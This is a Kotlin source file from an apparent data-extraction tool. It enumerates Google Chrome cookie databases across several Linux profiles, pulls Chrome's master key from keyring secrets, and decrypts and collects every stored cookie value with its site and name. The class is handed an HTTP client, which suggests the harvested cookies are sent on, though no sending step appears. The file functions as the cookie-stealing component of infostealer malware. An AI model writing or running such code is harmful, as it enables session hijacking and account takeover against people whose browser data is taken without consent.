package net.kerner.entkerner.extractors.chrome

import io.ktor.client.*
import net.kerner.entkerner.extractors.keyring.KeyRingSecret
import net.kerner.entkerner.io.FileUtils
import net.kerner.entkerner.io.nullPaths
import net.kerner.entkerner.model.ChromeCookie
import net.kerner.entkerner.model.ChromeCookieTable
import net.kerner.entkerner.model.SystemType
import net.kerner.entkerner.system
import org.jetbrains.exposed.sql.selectAll
import org.jetbrains.exposed.sql.transactions.transaction
import java.io.File
import java.nio.file.Path
import kotlin.io.path.div
import kotlin.io.path.isRegularFile
import kotlin.io.path.notExists

enum class ChromeBasedSystemCookieStorage(
    val windows: Path?,
    val linux: Path?,
    val darwin: Path?
) {
    GoogleChromeProfileDefault(null, FileUtils.Linux.config / "google-chrome" / "Default" / "Cookies", null),
    GoogleChromeProfile1(null, FileUtils.Linux.config / "google-chrome" / "Profile 1" / "Cookies", null),
    GoogleChromeProfile2(null, FileUtils.Linux.config / "google-chrome" / "Profile 2" / "Cookies", null),
    GoogleChromeProfile3(null, FileUtils.Linux.config / "google-chrome" / "Profile 3" / "Cookies", null),
    GoogleChromeProfile4(null, FileUtils.Linux.config / "google-chrome" / "Profile 4" / "Cookies", null),
    GoogleChromeProfile5(null, FileUtils.Linux.config / "google-chrome" / "Profile 5" / "Cookies", null)
}

class ChromeCookieExtractor(
    httpClient: HttpClient,
    private val keyRingSecrets: List<KeyRingSecret>?
) : ChromeCookieWorker<List<ChromeCookie>>(httpClient) {
    override val fileDirectories = nullPaths
    override val name = "ChromeCookieExtractor"

    override suspend fun extractData(file: File): List<ChromeCookie> {
        if (keyRingSecrets.isNullOrEmpty())
            return emptyList()

        val systemWideCookies = mutableListOf<ChromeCookie>()
        for (chromeSystem in ChromeBasedSystemCookieStorage.values()) {
        //for (chromeSystem in listOf(ChromeBasedSystem.GoogleChromeProfileDefault)) {
            val masterKey = keyRingSecrets.firstOrNull {
                it.attributes["application"].equals("chrome")
            }?.value ?: continue

            val cookieStorageOfEngine = when(system) {
                SystemType.LINUX -> chromeSystem.linux
                SystemType.WINDOWS -> chromeSystem.windows
                SystemType.XNU -> chromeSystem.darwin
            } ?: continue

            if (cookieStorageOfEngine.notExists() || !cookieStorageOfEngine.isRegularFile())
                continue

            val database = getSQLiteConnection(cookieStorageOfEngine)

            transaction(database) {
                val cookies = ChromeCookieTable.selectAll()
                    //.filter { it[ChromeCookieTable.hasExpires] }
                    .filter { it[ChromeCookieTable.encryptedValue].bytes.isNotEmpty() }
                    .map { cookie ->
                        //println(cookie[ChromeCookieTable.hostKey])
                        //println(cookie[ChromeCookieTable.name])
                        val encryptedValue = cookie[ChromeCookieTable.encryptedValue].bytes
                        val value = cookie[ChromeCookieTable.value]
                        val decryptedValue = when(value.isEmpty()) {
                            true -> decryptCookie(masterKey.toByteArray(), encryptedValue)
                            false -> value.toByteArray()
                        }
                        //println(String(decryptedValue, Charsets.UTF_8))
                        ChromeCookie(
                            name = cookie[ChromeCookieTable.name],
                            osCryptMasterKey = masterKey,
                            encryptedValue = String(encryptedValue),
                            decryptedValue = String(decryptedValue),
                            website = cookie[ChromeCookieTable.hostKey],
                            createTimeUTC = cookie[ChromeCookieTable.createTimeUTC],
                            profile = chromeSystem
                        )
                    }
                systemWideCookies.addAll(cookies)
            }
        }
        // todo: return sysyemWideCookies
        return systemWideCookies
    }
}